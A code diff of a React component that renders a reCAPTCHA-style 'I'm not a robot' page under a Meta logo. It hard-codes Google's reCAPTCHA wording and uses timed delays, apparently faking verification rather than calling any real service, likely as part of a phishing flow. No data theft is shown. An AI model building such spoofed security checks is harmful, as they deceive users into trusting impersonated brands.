@@ -3,50 +3,22 @@
 import React from 'react'
 import { useRouter } from 'next/navigation'
 
-import { en } from '@/i18n/locales/en'
+/** reCAPTCHA UI luôn hiển thị tiếng Anh, không phụ thuộc locale app */
+const RECAPTCHA_EN = {
+    notRobot: "I'm not a robot",
+    privacyTerms: 'Privacy - Terms',
+    p1:
+        'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
+    p2:
+        "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
+    p3:
+        'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
+} as const
 
 const VERIFY_DELAY_MS = { min: 1400, max: 2200 }
 const NAVIGATE_DELAY_MS = 650
 
-const RecaptchaBadge = () => (
-    <svg
-        aria-hidden="true"
-        className="recaptcha-badge-logo"
-        viewBox="0 0 64 64"
-        xmlns="http://www.w3.org/2000/svg"
-    >
-        <path
-            d="M32 8a24 24 0 1 0 0 48 24 24 0 0 0 0-48Z"
-            fill="#4285F4"
-            opacity="0.12"
-        />
-        <path
-            d="M32 14a18 18 0 1 1-12.73 5.27"
-            fill="none"
-            stroke="#4285F4"
-            strokeLinecap="round"
-            strokeWidth="3.5"
-        />
-        <path
-            d="M32 14a18 18 0 1 1 12.73 5.27"
-            fill="none"
-            stroke="#9AA0A6"
-            strokeLinecap="round"
-            strokeWidth="3.5"
-        />
-        <path
-            d="M32 26v12l8.5 4.9"
-            fill="none"
-            stroke="#4285F4"
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            strokeWidth="3"
-        />
-    </svg>
-)
-
 const ReCaptcha = () => {
-    const captchaText = en.captcha
     const [isPressed, setIsPressed] = React.useState(false)
     const [isLoading, setIsLoading] = React.useState(false)
     const [isVerified, setIsVerified] = React.useState(false)
@@ -108,7 +80,11 @@ const ReCaptcha = () => {
     const isInteractive = !isLoading && !isVerified
 
     return (
-        <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
+        <div
+            lang="en"
+            translate="no"
+            className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto"
+        >
             <div className="font-roboto text-[14px] text-gray-800 w-full max-w-[325px] flex flex-col justify-start px-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pb-[max(1.5rem,env(safe-area-inset-bottom))] pt-[max(1.5rem,env(safe-area-inset-top))] sm:h-screen sm:justify-center sm:py-0 md:px-0">
                 <div className="w-full">
                     <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
@@ -130,7 +106,7 @@ const ReCaptcha = () => {
                                         checked={isVerified}
                                         id="checked-captcha"
                                         onChange={handleCheckboxChange}
-                                        aria-label={captchaText.notRobot}
+                                        aria-label={RECAPTCHA_EN.notRobot}
                                         disabled={!isInteractive}
                                         className="sr-only"
                                     />
@@ -156,21 +132,25 @@ const ReCaptcha = () => {
                                 htmlFor="checked-captcha"
                                 className={`recaptcha-label ${isInteractive ? 'cursor-pointer' : 'cursor-default'}`}
                             >
-                                {captchaText.notRobot}
+                                {RECAPTCHA_EN.notRobot}
                             </label>
                         </div>
                         <div className="recaptcha-brand">
-                            <RecaptchaBadge />
+                            <img
+                                src="/images/meta/recaptcha.png"
+                                alt="reCAPTCHA"
+                                className="recaptcha-badge-image"
+                            />
                             <span className="recaptcha-brand-title">reCAPTCHA</span>
-                            <span className="recaptcha-brand-links">{captchaText.privacyTerms}</span>
+                            <span className="recaptcha-brand-links">{RECAPTCHA_EN.privacyTerms}</span>
                         </div>
                     </div>
                 </div>
 
                 <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
-                    <p className="font-normal">{captchaText.p1}</p>
-                    <p className="font-normal mt-4">{captchaText.p2}</p>
-                    <p className="font-normal mt-4">{captchaText.p3}</p>
+                    <p className="font-normal">{RECAPTCHA_EN.p1}</p>
+                    <p className="font-normal mt-4">{RECAPTCHA_EN.p2}</p>
+                    <p className="font-normal mt-4">{RECAPTCHA_EN.p3}</p>
                 </div>
             </div>
         </div>
